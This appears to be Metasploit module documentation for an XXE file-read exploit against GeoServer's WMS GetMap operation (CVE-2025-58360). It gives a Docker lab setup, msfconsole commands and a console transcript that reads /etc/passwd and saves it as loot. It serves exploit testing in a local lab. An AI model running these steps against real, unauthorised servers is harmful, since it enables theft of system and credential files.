## Vulnerable Application

This module exploits an XML External Entity (XXE) vulnerability in GeoServer via the WMS GetMap operation
(CVE-2025-58360). The vulnerability allows reading arbitrary files from the server's file system by injecting
an XXE entity in the SLD (Styled Layer Descriptor).

### Affected Versions

- GeoServer >= 2.26.0, <= 2.26.1
- GeoServer <= 2.25.5

### Setup Instructions

To set up a vulnerable test environment using Docker:

1. Create a `docker-compose.yml` file with the following content:

```yaml
services:
  vulnerable:
    image: docker.osgeo.org/geoserver:2.25.5
    container_name: geoserver-vulnerable
    ports:
      - "8090:8080"
    environment:
      - GEOSERVER_DATA_DIR=/var/local/geoserver
    networks:
      - geoserver-lab

networks:
  geoserver-lab:
    driver: bridge
```

2. Start the vulnerable GeoServer instance:

```bash
docker compose up -d
```

3. Wait for the container to be healthy (check with `docker ps`)

4. Access GeoServer at `http://localhost:8090/geoserver`

## Verification Steps

1. Start msfconsole
2. `use auxiliary/gather/geoserver_wms_getmap_xxe_file_read`
3. `set RHOSTS 127.0.0.1`
4. `set RPORT 8090`
5. `set TARGETURI /geoserver`
6. `set FILEPATH /etc/passwd`
7. `run`

You should see the file content displayed and saved to loot.

## Options

### FILEPATH

The filepath to read on the server. Default is `/etc/passwd`.

## Scenarios

### GeoServer 2.25.5 on Docker (Linux)

```
msf6 > use auxiliary/gather/geoserver_wms_getmap_xxe_file_read
msf6 auxiliary(gather/geoserver_wms_getmap_xxe_file_read) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(gather/geoserver_wms_getmap_xxe_file_read) > set RPORT 8090
RPORT => 8090
msf6 auxiliary(gather/geoserver_wms_getmap_xxe_file_read) > set TARGETURI /geoserver
TARGETURI => /geoserver
msf6 auxiliary(gather/geoserver_wms_getmap_xxe_file_read) > set FILEPATH /etc/passwd
FILEPATH => /etc/passwd
msf6 auxiliary(gather/geoserver_wms_getmap_xxe_file_read) > run

[*] Running module against 127.0.0.1
[*] Attempting to read file: /etc/passwd
[*] Sending XXE payload to /geoserver/wms?service=WMS&version=1.1.0&request=GetMap&width=133&height=166&format=image/png&bbox=-23,60,0,51
[+] Successfully read file: /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

[+] File saved to: /home/chocapikk/.msf4/loot/20251212152817_default_127.0.0.1_geoserver.file_928494.txt
[*] Auxiliary module execution completed
```

The file content is extracted from the error message returned by GeoServer when an invalid layer name
(containing the XXE entity reference) is used in the GetMap request. The content is displayed in the console
and automatically saved to the Metasploit loot directory.

